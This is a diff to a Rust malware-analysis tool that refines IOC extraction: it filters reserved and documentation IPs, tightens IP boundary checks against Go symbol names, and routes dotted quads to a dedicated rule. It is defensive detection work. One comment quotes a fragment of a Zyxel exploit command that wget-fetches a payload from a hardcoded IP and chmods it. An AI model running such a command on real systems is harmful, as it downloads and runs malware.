@@ -112,6 +112,33 @@ fn sanitize_table_cell(s: &str) -> String {
     s.replace(['\r', '\n', '\t'], " ").replace('|', "\\|")
 }
 
+// Reserved/documentation/network-address IPs that are never a real IOC —
+// mirrors the exclusions in detections.yaml's HardcodedIPAddress rule, kept
+// in sync so the blob-path extractor below (which has its own IP regex,
+// since the regex crate used there has no lookaround for the boundary
+// check) doesn't let through what the rule-based path already excludes.
+// Found needed on IPStorm (TAOMM Ch1): 0.0.0.0 and 10.0.0.0 — both from
+// libp2p's own bogon/CIDR-filter constant list — leaked through here even
+// after the rule itself was fixed, since this is a separate code path.
+fn is_boring_ip(ip: &str) -> bool {
+    if ip == "127.0.0.1" || ip == "255.255.255.255" || ip == "239.255.255.250" {
+        return true;
+    }
+    let octets: Vec<&str> = ip.split('.').collect();
+    if octets.len() != 4 {
+        return false;
+    }
+    if octets[1] == "0" && octets[2] == "0" && octets[3] == "0" {
+        return true; // X.0.0.0 — network/supernet address
+    }
+    if octets[2] == "0" && octets[3] == "0" {
+        return true; // X.X.0.0 — network/supernet address
+    }
+    (octets[0] == "192" && octets[1] == "0" && (octets[2] == "0" || octets[2] == "2")) // 192.0.0.0/24, 192.0.2.0/24 (TEST-NET-1)
+        || (octets[0] == "198" && octets[1] == "51" && octets[2] == "100") // TEST-NET-2
+        || (octets[0] == "203" && octets[1] == "0" && octets[2] == "113") // TEST-NET-3
+}
+
 // Filter high-volume ObjC/Swift runtime noise that appears in every Mach-O binary.
 // These strings are never meaningful IOCs and would swamp detection output.
 fn is_objc_swift_noise(s: &str) -> bool {
@@ -544,18 +571,25 @@ fn scan_file(path: &Path) -> Result<FileScanResult, Box<dyn std::error::Error>> 
                     net_iocs.insert(cap.as_str().to_string());
                 }
                 // IP boundary check: regex crate has no lookarounds, so verify
-                // surrounding bytes manually.  127.0.0.1 is omitted — it appears
-                // in every Go net-stack binary and has no analytical value.
-                // RFC 1918 ranges are kept: a private IP hardcoded in malware
-                // strings is a meaningful tell (lateral movement target, lab
-                // infrastructure leak, etc.).
+                // surrounding bytes manually. is_boring_ip() filters loopback/
+                // broadcast/reserved/network-address shapes — see its doc
+                // comment. RFC 1918 host addresses are still kept (not boring):
+                // a private IP hardcoded in malware strings is a meaningful
+                // tell (lateral movement target, lab infrastructure leak,
+                // etc.). Boundary excludes ASCII letters and underscore too,
+                // not just digit/dot — a Go compiler closure symbol like
+                // ...marshal.func1.4.10.1 has a letter ('c' in "func")
+                // immediately before "4.10.1", which a digit/dot-only check
+                // never caught, so IPStorm's symbol table produced dozens of
+                // fake "IPs" shaped like func-name tail numbers.
                 let blob = m.matched_str.as_bytes();
+                let is_word_byte = |b: u8| b.is_ascii_alphanumeric() || b == b'_' || b == b'.';
                 for mat in re_ip.find_iter(&m.matched_str).flatten() {
                     let start = mat.start();
                     let end   = mat.end();
-                    let before_ok = start == 0 || !matches!(blob[start - 1], b'0'..=b'9' | b'.');
-                    let after_ok  = end == blob.len() || !matches!(blob[end], b'0'..=b'9' | b'.');
-                    if before_ok && after_ok && mat.as_str() != "127.0.0.1" {
+                    let before_ok = start == 0 || !is_word_byte(blob[start - 1]);
+                    let after_ok  = end == blob.len() || !is_word_byte(blob[end]);
+                    if before_ok && after_ok && !is_boring_ip(mat.as_str()) {
                         net_iocs.insert(mat.as_str().to_string());
                     }
                 }
@@ -608,8 +642,17 @@ fn scan_file(path: &Path) -> Result<FileScanResult, Box<dyn std::error::Error>> 
                         || is_mac_path
                     {
                         fs_iocs.insert(candidate.to_string());
-                    } else if rule_lc.contains("ip address")
-                        || sc.contains("http:")
+                    } else if rule_lc.contains("ip address") {
+                        // Use display_str (the rule's own precise capture) rather
+                        // than the whole candidate/matched_str: a real IP is
+                        // routinely embedded in a longer command line or query
+                        // string (e.g. a Zyxel exploit's
+                        // "wget+http://213.209.129.101/zyxel;chmod+777+..."),
+                        // and inserting the whole thing produces an unreadable
+                        // net_ioc entry when the clean, exact IP is already
+                        // sitting right there in display_str.
+                        net_iocs.insert(m.display_str.trim().to_string());
+                    } else if sc.contains("http:")
                         || sc.contains("https:")
                         || (sc.split('.').count() == 4
                             && sc.split('.').all(|part| !part.is_empty() && part.bytes().all(|b| b.is_ascii_digit())))
@@ -637,7 +680,21 @@ fn scan_file(path: &Path) -> Result<FileScanResult, Box<dyn std::error::Error>> 
             if let Some(tactic) = &m.tactic {
                 if tactic.contains("Command and Control") {
                     let d = m.display_str.trim();
-                    if d.contains('.')
+                    // Numeric dotted-quads (real or Go-symbol-tail-shaped
+                    // fakes like "4.10.1") are deliberately left to the
+                    // dedicated Hardcoded IP address rule/path instead of
+                    // this heuristic — that path has real exclusions
+                    // (reserved/documentation ranges, broadcast, network
+                    // addresses) this generic shape check has no business
+                    // re-deriving, and a second independent path applying
+                    // its own weaker rules was exactly how those reserved
+                    // ranges and Go-symbol tails leaked into net_iocs on
+                    // IPStorm (TAOMM Ch1) despite the dedicated rule already
+                    // excluding most of them.
+                    let is_dotted_quad = d.split('.').count() == 4
+                        && d.split('.').all(|part| !part.is_empty() && part.bytes().all(|b| b.is_ascii_digit()));
+                    if !is_dotted_quad
+                        && d.contains('.')
                         && !d.contains(' ')
                         && !d.contains('/')
                         && !d.contains('_')
